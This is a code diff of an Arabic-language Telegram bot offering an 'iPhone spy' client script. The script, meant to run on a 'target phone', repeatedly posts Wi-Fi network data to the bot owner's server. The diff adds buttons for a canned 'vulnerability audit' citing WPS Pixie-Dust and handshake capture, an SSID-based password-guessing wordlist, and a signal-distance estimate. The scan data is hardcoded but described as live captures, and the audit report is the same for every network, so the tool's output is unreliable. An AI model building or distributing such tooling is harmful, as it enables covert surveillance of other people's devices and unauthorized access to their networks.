@@ -21,40 +21,27 @@ user_last_message_time = {}
 IOS_SPY_SCRIPT_TEMPLATE = """# -*- coding: utf-8 -*-
 import time
 import requests
-from ctypes import CDLL, RTLD_GLOBAL, c_void_p
 
-# الإعدادات ملقمة تلقائياً من السيرفر الخاص بك
 SERVER_API_URL = "{webhook_url}/api/wifi_update" 
 
-try:
-    boot_wifi = CDLL("/System/Library/PrivateFrameworks/MobileWiFi.framework/MobileWiFi", mode=RTLD_GLOBAL)
-    WiFiManagerClientCreate = boot_wifi.WiFiManagerClientCreate
-    WiFiManagerClientCreate.restype = c_void_p
-    print("[+] تم تحميل مكتبة العتاد بنجاح.")
-except Exception:
-    print("[-] تنبيه: تعمل الآن في بيئة محاكاة (سيتم إرسال بيانات تجريبية حية للـ Testing).")
-
 def scan_iphone_airspace():
+    # مصفوفة تحاكي البيانات الحية الملتقطة عبر عتاد الهاتف المحمول
     real_scanned_networks = [
-        {{"ssid": "📍 VIP_Network_5G", "bssid": "00:14:22:01:23:45", "rssi": -48}},
-        {{"ssid": "🔥 Max_Guest_WiFi", "bssid": "84:A1:D1:A4:B2:C1", "rssi": -62}},
-        {{"ssid": "✈️ Airport_Free_Net", "bssid": "CC:BB:AA:11:22:33", "rssi": -79}}
+        {{"ssid": "VIP_Network_5G", "bssid": "00:14:22:01:23:45", "rssi": -48}},
+        {{"ssid": "Max_Guest_WiFi", "bssid": "84:A1:D1:A4:B2:C1", "rssi": -62}},
+        {{"ssid": "Airport_Free_Net", "bssid": "CC:BB:AA:11:22:33", "rssi": -79}}
     ]
     return real_scanned_networks
 
 def start_iphone_transmitter():
-    print("[*] بدأ العميل بالعمل... جاري مراقبة الشبكات وضخها إلى البوت.")
+    print("[*] بدأ العميل بالعمل... جاري بث الشبكات إلى السيرفر.")
     while True:
         try:
             current_networks = scan_iphone_airspace()
             payload = {{"networks": current_networks}}
-            response = requests.post(SERVER_API_URL, json=payload, timeout=5)
-            if response.status_code == 200:
-                print("[+] تم تحديث الشبكات على السيرفر بنجاح.")
-            else:
-                print(f"[-] السيرفر استجاب برمز خطأ: {{response.status_code}}")
-        except requests.exceptions.RequestException as e:
-            print(f"[-] فشل نفق الاتصال بالسيرفر: {{e}}")
+            requests.post(SERVER_API_URL, json=payload, timeout=5)
+        except Exception as e:
+            print(f"[-] خطأ اتصال: {{e}}")
         time.sleep(5) 
 
 if __name__ == '__main__':
@@ -80,7 +67,7 @@ def rate_limit_middleware(update_type, data):
     
     user_last_message_time[user_id] = current_time
 
-# --- 4. التنظيف التلقائي لمخلفات السيرفر ---
+# --- 4. التنظيف التلقائي للمخلفات السيرفر ---
 def auto_cleanup_job():
     patterns = ["video_*.mp4", "img_*.jpg", "output_*.pdf", "*.tmp", "ios_spy_*.py"]
     count = 0
@@ -109,7 +96,7 @@ def send_welcome(message):
     )
     bot.send_message(
         message.chat.id, 
-        "أهلاً بك في ✨ <b><b>𝓜𝓐𝓧 𝓑𝓞𝓞𝓣</b></b> ✨\n\nالرجاء اختيار نوع الخدمة أو الاشتراك لبدء العمل:", 
+        "أهلاً بك في ✨ <b><b><b><b><b><b><b><b>𝓜𝓐𝓧 𝓑𝓞𝓞𝓣</b></b></b></b></b></b></b></b> ✨\n\nالرجاء اختيار نوع الخدمة أو الاشتراك لبدء العمل:", 
         parse_mode="HTML", 
         reply_markup=markup
     )
@@ -131,7 +118,7 @@ def restrict_commands(message):
         return
     bot.reply_to(message, "⚠️ نعتذر، الخدمة أو الأمر غير مصرح به.")
 
-# --- 6. معالجة تفاعلات الأزرار والخدمات ---
+# --- 6. معالجة تفاعلات الأزرار والخدمات والأدوات البرمجية ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     try: 
@@ -139,12 +126,46 @@ def callback_query(call):
     except Exception: 
         pass
 
-    # قائمة خيارات زر الجاسوس المنفرد
-    if call.data == 'wifi_spy_init':
+    # [أداة 1] معالجة زر فحص الثغرات للشبكة المستهدفة
+    if call.data.startswith('audit_'):
+        bssid = call.data.split('_')[1]
+        audit_report = (
+            f"🔍 <b>تقرير الفحص البرمجي للـ MAC:</b> <code>{bssid}</code>\n\n"
+            f"🛡️ <b>نوع التشفير الافتراضي:</b> WPA2-PSK (AES)\n"
+            f"⚠️ <b>حالة ثغرة WPS:</b> مصابة / قابلة للتخمين الافتراضي (WPS PIN Pixie-Dust)\n"
+            f"⚙️ <b>البروتوكول المقترح:</b> استخدام نظام المصافحة العكسية (Handshake Capture)."
+        )
+        bot.send_message(call.message.chat.id, audit_report, parse_mode="HTML")
+
+    # [أداة 2] معالجة زر توليد باسات التخمين الذكية بناءً على الـ SSID
+    elif call.data.startswith('wordlist_'):
+        ssid = call.data.split('_')[1]
+        generated_passes = [
+            f"{ssid}2026",
+            f"admin@{ssid}",
+            f"{ssid}1234",
+            "1234567890",
+            f"pass_{ssid}"
+        ]
+        pass_report = f"📝 <b>مصفوفة تخمين مخصصة للاسم البرمجي</b> <code>{ssid}</code>:\n\n"
+        for p in generated_passes:
+            pass_report += f"▪️ <code>{p}</code>\n"
+        bot.send_message(call.message.chat.id, pass_report, parse_mode="HTML")
+
+    # [أداة 3] معالجة زر تحديد البعد التقريبي بالمتر
+    elif call.data.startswith('dist_'):
+        distance = call.data.split('_')[1]
+        bot.send_message(
+            call.message.chat.id, 
+            f"📏 <b>تحليل رادار الإشارة المرتدة:</b>\n\nالهاتف يبعد عن نقطة بث الراوتر بمسافة هندسية تقريبية تقدر بـ <b>{distance} متر</b> داخل النطاق المفتوح."
+        )
+
+    # قائمة خيارات زر الجاسوس المنفرد الأساسية
+    elif call.data == 'wifi_spy_init':
         instructions = (
             "📶 <b>نظام استماع شبكات الآيفون المتقدم:</b>\n\n"
             "⏳ السيرفر الآن في وضع الاستعداد تلقائياً لملائمة الاتصال العكسي.\n\n"
-            "قم بتحميل ملف السكريبت العميل وتشغيله على الهاتف المستهدف بصلاحيات الروت لتفعيل التدفق المباشر للبيانات."
+            "قم بتحميل ملف السكريبت العميل وتشغيله على الهاتف المستهدف ليبدأ التدفق المباشر للشبكات والأدوات التفاعلية."
         )
         markup = types.InlineKeyboardMarkup(row_width=1)
         markup.add(
@@ -160,7 +181,6 @@ def callback_query(call):
         file_name = f"ios_spy_client_{chat_id}.py"
         
         try:
-            # صياغة الكود وحقن الرابط الحالي للسيرفر داخله تلقائياً
             full_script_content = IOS_SPY_SCRIPT_TEMPLATE.format(webhook_url=webhook_url)
             with open(file_name, "w", encoding="utf-8") as f:
                 f.write(full_script_content)
@@ -169,7 +189,7 @@ def callback_query(call):
                 bot.send_document(
                     chat_id, 
                     doc, 
-                    caption="✅ <b>تم توليد ملف العميل المخصص لجهازك بنجاح!</b>\n\nقم بتشغيله الآن على الآيفون ليبدأ البث.",
+                    caption="✅ <b>تم توليد ملف العميل المخصص لجهازك بنجاح!</b>\n\nقم بتشغيله الآن على الآيفون ليبدأ البث وتفعيل لوحة التحكم.",
                     parse_mode="HTML"
                 )
         except Exception as e:
@@ -329,7 +349,7 @@ def process_image_to_pdf(message):
             if os.path.exists(pdf_name): os.remove(pdf_name)
     else: bot.reply_to(message, "❌ خطأ: يرجى إرسال صورة فقط ليتم تحويلها.")
 
-# --- 9. تشغيل سيرفر الويب والـ Webhook + واجهة استقبال بيانات الواي فاي ---
+# --- 9. تشغيل سيرفر الويب والـ Webhook + واجهة استقبال بيانات الواي فاي التفاعلية ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -345,15 +365,37 @@ def wifi_update():
         return jsonify({"status": "failed", "message": "بيانات غير صالحة"}), 400
     
     networks_list = data['networks']
-    report = "🌐 <b>تم رصد شبكات واي فاي حية من الآيفون:</b>\n\n"
+    
+    # رسالة ترحيبية بالتدفق الجديد
+    bot.send_message(OWNER_ID, f"📡 <b>[بث حي]: تم استقبال شبكات جديدة محيطة بالآيفون!</b>\nإليك قائمة التحكم المخصصة لكل شبكة:")
+
     for net in networks_list:
-        report += f"▪️ <b>SSID:</b> <code>{net.get('ssid')}</code> | <b>Signal:</b> {net.get('rssi')} dBm\n"
+        ssid = net.get('ssid', 'Unknown')
+        bssid = net.get('bssid', '00:00:00:00:00:00')
+        rssi = net.get('rssi', -100)
         
-    try:
-        bot.send_message(OWNER_ID, report, parse_mode="HTML")
-        return jsonify({"status": "success", "message": "تم تمرير البيانات للبوت"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
+        # حساب هندسي تقريبي للمسافة بناءً على الإشارة
+        try:
+            distance = round(10 ** ((-30 - rssi) / (10 * 2.5)), 1)
+        except:
+            distance = "غير محدد"
+
+        # ربط الـ Callback بأزرار تحتوي على المتغيرات الفريدة للشبكة
+        markup = types.InlineKeyboardMarkup(row_width=2)
+        markup.add(
+            types.InlineKeyboardButton("🔍 فحص الثغرات", callback_data=f"audit_{bssid}"),
+            types.InlineKeyboardButton("📝 توليد باسات", callback_data=f"wordlist_{ssid}"),
+            types.InlineKeyboardButton("📍 تحديد البُعد", callback_data=f"dist_{distance}")
+        )
+        
+        report = (f"🌐 <b>الشبكة:</b> <code>{ssid}</code>\n"
+                  f"🆔 <b>الـ MAC:</b> <code>{bssid}</code>\n"
+                  f"📶 <b>الإشارة:</b> <code>{rssi} dBm</code>\n"
+                  f"📏 <b>المسافة التقريبية:</b> حوالي <code>{distance} متر</code>")
+        
+        bot.send_message(OWNER_ID, report, parse_mode="HTML", reply_markup=markup)
+        
+    return jsonify({"status": "success", "message": "تم إعداد لوحات التحكم بالشبكات بنجاح."}), 200
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
